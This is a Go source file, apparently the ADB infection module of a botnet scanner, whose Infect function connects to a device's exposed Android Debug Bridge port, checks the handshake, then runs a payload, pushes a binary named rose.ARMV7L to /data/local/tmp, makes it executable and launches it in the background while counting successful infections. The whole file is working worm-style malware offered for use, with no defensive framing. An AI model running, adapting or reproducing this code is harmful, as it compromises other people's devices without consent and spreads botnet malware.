package adb

import (
	"fmt"
	"net"
	"os/exec"
	"scanner/components/utils"
	"strings"
	"time"
)

// adb infect !!!

var (
	CmdConnectMagic = 0xb1a7b1bc
	CmdConnect      = 0x4e584e43
	AdbVersion      = 0x01000000
	MaxPayload      = 4096
)

type Message struct {
	Command   int /* command identifier constant (A_CNXN, ...) */
	Arg0      int /* first argument                            */
	Arg1      int /* second argument                           */
	DataLen   int /* length of payload (0 is allowed)          */
	DataCrc32 int /* crc32 of data payload                     */
	Magic     int /* command ^ 0xffffffff                      */
}

func Infect(Address string, Port int) {
	Socket, Err := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", Address, Port), 5*time.Second)

	if Err != nil {
		return
	}

	defer Socket.Close()

	// Send connect message
	M := Message{
		Command:   CmdConnect,
		Arg0:      AdbVersion,
		Arg1:      MaxPayload,
		Magic:     CmdConnectMagic,
		DataLen:   0,
		DataCrc32: 0,
	}

	// Send connect message
	_, Err = Socket.Write([]byte{
		byte(M.Command),
		byte(M.Command >> 8),
		byte(M.Command >> 16),
		byte(M.Command >> 24),
		byte(M.Arg0),
		byte(M.Arg0 >> 8),
		byte(M.Arg0 >> 16),
		byte(M.Arg0 >> 24),
		byte(M.Arg1),
		byte(M.Arg1 >> 8),
		byte(M.Arg1 >> 16),
		byte(M.Arg1 >> 24),
		byte(M.DataLen),
		byte(M.DataLen >> 8),
		byte(M.DataLen >> 16),
		byte(M.DataLen >> 24),
		byte(M.DataCrc32),
		byte(M.DataCrc32 >> 8),
		byte(M.DataCrc32 >> 16),
		byte(M.DataCrc32 >> 24),
		byte(M.Magic),
		byte(M.Magic >> 8),
		byte(M.Magic >> 16),
		byte(M.Magic >> 24),
	})
	if Err != nil {
		return
	}

	// wait for response
	Buff := make([]byte, 4096)
	_, Err = Socket.Read(Buff)
	if Err != nil {
		return
	}
	
	if !strings.Contains(string(Buff), "CNXN") {
		return
	}
	utils.AdbFound++
	
	// open process shell and connect to adb device and send payload then disconnect device
	B, Err := exec.Command("bash", "-c", fmt.Sprintf(`adb connect %s:%d`, Address, Port)).Output()
	if Err != nil {
		fmt.Println(Err)
		return
	}
	
	if !strings.Contains(string(B), "connected to") {
		return
	}
	
	_, err := exec.Command("bash", "-c", fmt.Sprintf(`adb -s %s:%d shell "%s";adb -s %s:%d push /root/rose/bin/builds/rose.ARMV7L /data/local/tmp;adb -s %s:%d shell "chmod +x ./data/local/tmp/rose.ARMV7L;./data/local/tmp/rose.ARMV7L adb_push &";adb disconnect %s:%d`, Address, Port, utils.Payload, Address, Port, Address, Port, Address, Port)).Output()
	if err == nil {
		utils.ExploitSent++
	}
}
